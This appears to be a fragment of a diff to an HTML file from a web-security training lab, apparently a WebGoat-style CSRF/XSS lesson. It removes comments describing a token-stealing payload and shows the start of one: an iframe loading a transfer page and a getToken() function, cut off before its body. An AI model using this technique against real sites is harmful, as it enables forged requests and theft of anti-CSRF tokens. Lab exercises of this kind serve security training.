@@ -1,6 +1,3 @@
-<!-- Exploitable field: Message -->
-<!-- Payload: we load the page containing token inside iframe first, and use onload to extract the value of the token and append to our uri -->
-
 <iframe id="xss_frame" src="attack?Screen=803158781&menu=900&transfer=main" onload="getToken()"></iframe>
 <script>
 function getToken() {
